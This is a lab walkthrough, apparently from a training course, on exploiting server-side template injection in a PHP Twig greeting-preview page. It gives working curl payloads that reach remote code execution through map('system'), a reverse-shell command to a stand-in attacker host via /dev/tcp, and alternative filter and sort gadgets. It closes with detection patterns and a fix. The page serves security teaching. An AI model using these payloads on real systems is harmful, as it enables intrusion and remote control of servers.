# C09 · Station E — SSTI (Twig) · ★★★☆

> **Chapter:** [[Chapter-09-Overview]] · **Next:** [[C09-Station-F-PHP-Deserialization]]
> **Host:** `hollow-portal-01` (`target-web`) · **Target:** `/preview.php?name=` (greeting preview)
> **The bug:** the preview builds a Twig template **from your input** and compiles it. You are the template author, so `{{7*7}}` runs — and Twig filters reach PHP.

Server-Side Template Injection: the difference between your text being *data* and your text being *code*.

---

## 1. Exploit — do this first

```bash
# confirm it evaluates (not just reflects)
attacker$ curl -G http://target-web/preview.php --data-urlencode 'name={{7*7}}'
  <p>Hi 49, a file has been shared with you on Hollow Share.</p>

# RCE: Twig applies the named PHP callable to each array element
attacker$ curl -G http://target-web/preview.php \
  --data-urlencode "name={{['cat /var/www/flag.txt']|map('system')|join}}"
R2R{w3b_rce_is_your_front_d00r}
```

Reverse shell (listener on the attacker):

```bash
attacker$ curl -G http://target-web/preview.php \
  --data-urlencode "name={{['bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"']|map('system')}}"
```

| Token | What it does |
|---|---|
| `{{7*7}}` | the universal SSTI probe — renders `49` only if evaluated |
| `['cat …']` | a one-element Twig array holding your command |
| `\|map('system')` | applies the PHP callable `system` to each element → runs it |
| `\|join` | prints the collected return values |

---

## 2. How you find it

```bash
attacker$ curl -G http://target-web/preview.php --data-urlencode 'name=Alex'   # -> Hi Alex,
attacker$ curl -G http://target-web/preview.php --data-urlencode 'name={{7*7}}' # -> Hi 49,
```

`Alex` reflects; `{{7*7}}` becomes `49`. Reflection that *does arithmetic* is template injection, not XSS. Fingerprint the engine: `{{7*'7'}}` → `49` is Twig/Jinja-style; here it is Twig.

---

## 3. Why it works

```php
$tplSource = "<p>Hi {$name}, …</p>";
$twig->createTemplate($tplSource)->render();   // user input compiled as template
```

`createTemplate($userInput)` makes the **user** the template author. A non-sandboxed Twig environment exposes `map`/`filter`/`sort`/`reduce`, which take a callback name and invoke it through PHP — so `map('system')` calls `system()` on your element. Your text stopped being a value and became program source.

---

## 4. Pitfalls

- **`{{7*7}}` must render `49`.** If you see a literal `{{7*7}}`, it's reflection, not SSTI — wrong station.
- **`system()` prints directly** to the response and returns the last line; `|join` or `|first` tidies the output, but the flag shows regardless.
- **`['id']|filter('system')` and `|sort('system')`** are equivalent gadgets if `map` is ever filtered.
- **Reverse shells** still go through `system()` → `sh`; wrap in `bash -c`.

---

## 5. Detect & fix

- **Detect:** `{{`, `}}`, `{%`, `|map(`/`|filter(` in parameters; Twig `SyntaxError` in logs from user input. Recipes in [[Blue-Team-Playbook]].
- **Fix:** pass user input as a **render variable** into a fixed template (`$twig->render('greeting.twig', ['name'=>$name])`), never build template source from it; if dynamic templates are unavoidable, use Twig's `SandboxExtension` with a strict allow-list. More in [[Blue-Team-Playbook]].

---

## 6. What you learned

- The bug is making the user a template *author* instead of a *value*. Render variables, don't concatenate templates.
- `{{7*7}}` is the one probe that tells data from code across Twig, Jinja2, Freemarker, and friends.
- Next, code execution through object rebuilding: [[C09-Station-F-PHP-Deserialization]].

> Next: [[C09-Station-F-PHP-Deserialization]] · Related: [[C09-Station-D-LFI-RCE]] · [[Blue-Team-Playbook]]
